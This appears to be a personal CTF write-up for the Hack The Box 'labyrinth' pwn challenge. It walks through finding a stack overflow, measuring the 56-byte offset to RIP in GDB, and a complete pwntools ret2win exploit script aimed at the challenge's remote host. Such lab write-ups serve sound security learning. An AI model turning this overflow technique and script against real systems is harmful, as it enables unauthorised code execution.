
2024-08-02 19:02

Source: #htb #CTF 

Tags: [[Binary Exploit]]

> [!NOTE]
> 
> The binary has [Full RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/) enabled, which removes the possibility of a [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/) overwrite attack. Additionally, there is no [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/) and no PIE, which means we can use a straightforward ROP technique.

the code asks us to choose a door and if we choose the door `69` or `069`, we get another opportunity to input a value. If we fail to provide the value, it will be stored in the `local_38` variable, which has a size of `0x44` and can lead to a stack overflow.

It appears that this function `escape_plan` is responsible for printing the flag.

Therefore, in order to obtain the flag, we need to overwrite the `RIP` address with the address of the `escape_plan` function, which can be achieved by exploiting the stack overflow.

To determine the exact offset between `local_38` and `RIP` we use [[GDB]]

disassemble main function 
Based on the decompiled code, we need to set a breakpoint after the second input on `0x00000000004015da <+469>: mov rax,QWORD PTR [rip+0x2a2f] # 0x404010 <stdout@GLIBC_2.2.5>`.

To set the breakpoint on `b *main+469`, we can execute the following commands:2
After setting the breakpoint, we can input `AAAAAAAAAAAAAAAAAAAA` and execute the program until it hits the breakpoint.

Once the program hits the breakpoint, we can use search-pattern to find our input in the memory:

```shell
gef➤  search-pattern AAAAAAAAAAAAA
```

This will search for our input in the memory and display the memory address where it is located. We can use this address to determine the exact offset between `local_38` and `RIP`.

We found the input at address `0x7fffffffddb0`, We can use the `info frame` (`i f`) command to locate the address of `RIP`:

```shell
gef➤  i f
```
Based on the calculation, the offset between `local_38` and `RIP` is `0x7fffffffdde8-0x7fffffffddb0=0x38` which is `56`.

We also need the address of the `escape_plan` function:

```shell
gef➤  print escape_plan 
```
To recap, we have the following information:

1. The offset between the buffer `local_38` and `RIP` is `56` bytes.
2. The target address of the `escape_plan` function is `0x401255`.

We need to add a `ret` instruction because the stack is misaligned.

We can use this information to craft our exploit and overwrite the value of `RIP` with the address of the `escape_plan` function, which will cause the program to jump to the `escape_plan` function and print the flag.

We can obtain the ret instruction address using `ROPgadget`. The `ret` instruction is required to fix the misalignment of the stack caused by the stack overflow:
```shell
$ ROPgadget --binary ./labyrinth --only "ret"
```
### Automation 

`python3 exploit.py REMOTE` use this command to run the file 

```python
from pwn import *

elf = ELF('./labyrinth')
libc = elf.libc

if args.REMOTE:
    p = remote('209.97.134.50', 31510)
else:
    p = process(elf.path)

ret_addr = p64(0x401016) # From ROPgadget
payload = b"A"*(56) + ret_addr + p64(elf.symbols['escape_plan'])

print(p.recvuntil('>>').decode('utf-8'))
p.sendline("069")
print(p.recvuntil('>>').decode('utf-8'))

p.sendline(payload)
print(p.recvall().decode('utf-8'))
```

### References

https://github.com/evyatar9/Writeups/tree/master/CTFs/2023-Cyber_Apocalypse_HTB/Pwn-Labyrinth